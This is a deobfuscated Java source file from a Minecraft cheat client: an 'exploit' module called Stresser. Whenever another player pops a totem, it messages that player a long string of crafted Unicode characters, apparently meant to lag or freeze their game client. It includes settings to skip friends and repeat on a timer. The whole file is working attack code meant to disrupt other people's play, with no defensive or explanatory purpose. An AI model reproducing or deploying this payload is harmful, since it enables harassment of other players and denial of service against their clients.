//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "G:\PortableSoft\JBY\MC_Deobf3000\1.12-MCP-Mappings"!

package me.rebirthclient.mod.modules.impl.exploit;

import java.util.ArrayList;
import me.rebirthclient.api.managers.Managers;
import me.rebirthclient.api.util.EntityUtil;
import me.rebirthclient.api.util.Timer;
import me.rebirthclient.mod.modules.Category;
import me.rebirthclient.mod.modules.Module;
import me.rebirthclient.mod.modules.settings.Setting;
import net.minecraft.entity.player.EntityPlayer;

public class Stresser extends Module {
   public static final ArrayList<EntityPlayer> lagMap = new ArrayList();
   public final Setting<String> msgString = this.add(new Setting<>("msgString", "minecraft:msg"));
   private final Setting<Integer> delay = this.add(new Setting<>("Delay", 1000, 0, 5000));
   private final Setting<Boolean> load = this.add(new Setting<>("Load", false));
   private final Setting<Boolean> onlyOne = this.add(new Setting<>("OnlyOne", true).setParent());
   private final Setting<Boolean> reset = this.add(new Setting<>("Reset", false, v -> this.onlyOne.isOpen()));
   private final Setting<Boolean> friends = this.add(new Setting<>("NoFriends", true));
   private final Setting<Boolean> logDisable = this.add(new Setting<>("DisableOnDc", true));
   private final Setting<Boolean> safety = this.add(new Setting<>("Safety", false).setParent());
   private final Setting<Integer> health = this.add(new Setting<>("StopHealth", 4, 1, 15, v -> this.safety.isOpen()));
   private final Timer delayTimer = new Timer();

   public Stresser() {
      super("Stresser", "THEY CHINESE LAGGED ME", Category.EXPLOIT);
   }

   @Override
   public void onUpdate() {
      if (this.load.getValue()) {
         this.sendLagMessage(mc.getSession().getUsername());
         this.load.setValue(false);
      }

      if (this.reset.getValue()) {
         lagMap.clear();
         this.reset.setValue(false);
      }
   }

   @Override
   public void onTotemPop(EntityPlayer player) {
      if (!fullNullCheck()
         && player != mc.player
         && (!this.safety.getValue() || !(EntityUtil.getHealth(mc.player) <= (float)this.health.getValue().intValue()))
         && (!this.friends.getValue() || !Managers.FRIENDS.isFriend(player.getName()))
         && (!lagMap.contains(player) || !this.onlyOne.getValue())) {
         if (this.delayTimer.passedMs((long)this.delay.getValue().intValue())) {
            lagMap.add(player);
            this.sendLagMessage(player.getName());
         }
      }
   }

   @Override
   public void onLogout() {
      if (!mc.isSingleplayer() && this.isOn() && !fullNullCheck() && this.logDisable.getValue()) {
         this.disable();
      }
   }

   private void sendLagMessage(String playerName) {
      mc.player
         .sendChatMessage(
            "/"
               + (String)this.msgString.getValue()
               + " "
               + playerName
               + " āȁ́Ёԁ\u0601܁ࠁँਁଁก༁ခᄁሁጁᐁᔁᘁᜁ᠁ᤁᨁᬁᰁᴁḁἁ ℁∁⌁␁━✁⠁⤁⨁⬁Ⰱⴁ⸁⼁、\u3101㈁㌁㐁㔁㘁㜁㠁㤁㨁㬁㰁㴁㸁㼁䀁䄁䈁䌁䐁䔁䘁䜁䠁䤁䨁䬁䰁䴁丁企倁儁刁匁吁唁嘁圁堁夁威嬁封崁币弁态愁戁持搁攁昁朁栁椁樁欁氁洁渁漁瀁焁爁猁琁甁瘁省码礁稁笁簁紁縁缁老脁舁茁萁蔁蘁蜁蠁褁訁謁谁贁踁輁送鄁鈁錁鐁锁阁霁頁餁騁鬁鰁鴁鸁鼁ꀁꄁꈁꌁꐁꔁꘁ꜁ꠁ꤁ꨁꬁ각괁긁꼁뀁넁눁댁됁딁똁뜁렁뤁먁묁밁봁"
         );
   }
}
